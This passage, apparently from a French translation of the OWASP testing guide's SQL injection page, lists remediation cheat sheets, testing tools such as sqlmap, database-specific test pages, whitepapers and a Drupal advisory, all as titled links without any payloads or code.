- Pour sécuriser l'application contre les vulnérabilités d'injection SQL, reportez-vous au [SQL Injection Prevention CheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html).
- Pour sécuriser le serveur SQL, reportez-vous au [Database Security CheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/Database_Security_Cheat_Sheet.html).

Pour la sécurité générique de la validation des entrées, reportez-vous à [Input Validation CheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html).

## Outils

- [Chaînes Fuzz d'injection SQL (de l'outil wfuzz) - Fuzzdb](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection)
- [sqlbftools](http://packetstormsecurity.org/files/43795/sqlbftools-1.2.tar.gz.html)
- [Bernardo Damele A. G. : sqlmap, outil d'injection SQL automatique](http://sqlmap.org/)
- [Muhaimin Dzulfakar : MySqloit, outil de reprise d'injection MySql](https://github.com/dtrip/mysqloit)

## Références

- [Top 10 2017-A1-Injection](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection)
- [Injection SQL](https://owasp.org/www-community/attacks/SQL_Injection)

Des pages de guide de test spécifiques à la technologie ont été créées pour les SGBD suivants :

- [Oracle](05.1-Testing_for_Oracle.md)
- [MySQL](05.2-Testing_for_MySQL.md)
- [SQL Server](05.3-Testing_for_SQL_Server.md)
- [PostgreSQL](05.4-Testing_PostgreSQL.md)
- [MS Access](05.5-Testing_for_MS_Access.md)
- [NoSQL](05.6-Testing_for_NoSQL_Injection.md)
- [ORM](05.7-Testing_for_ORM_Injection.md)
- [Côté client](05.8-Testing_for_Client-side.md)

### Papiers blanc

- [Victor Chapela : "Injection SQL avancée"](http://cs.unh.edu/~it666/reading_list/Web/advanced_sql_injection.pdf)
- [Chris Anley : "Injection SQL plus avancée"](https://www.cgisecurity.com/lib/more_advanced_sql_injection.pdf)
- [David Litchfield : "Exploration de données avec injection et inférence SQL"](https://dl.packetstormsecurity.net/papers/attack/sqlinference.pdf)
- [Imperva : "Injection SQL en aveugle"](https://www.imperva.com/lg/lgw.asp?pid=369)
- [PortSwigger : "Aide-mémoire d'injection SQL"](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [Kevin Spett de SPI Dynamics : "Blind SQL Injection"](https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Blind_SQLInjection.pdf)
- ["ZeQ3uL" (Prathan Phongthiproek) et "Suphot Boonchamnan": "Au-delà de SQLi : obscurcir et contourner"](https://www.exploit-db.com/papers/17934/)
- [Adi Kaploun et Eliran Goshen, équipe Check Point Threat Intelligence & Research : "Les dernières tendances en matière d'injection SQL"](http://blog.checkpoint.com/2015/05/07/latest-sql-injection-trends/)

### Documentation sur les vulnérabilités d'injection SQL dans les produits

- [Anatomie de l'injection SQL dans le système de filtrage des commentaires de la base de données Drupal SA-CORE-2015-003](https://www.vanstechelman.eu/content/anatomy-of-the-sql-injection-in-drupals-database-système-de-filtrage-des-commentaires-sa-core-2015-003)
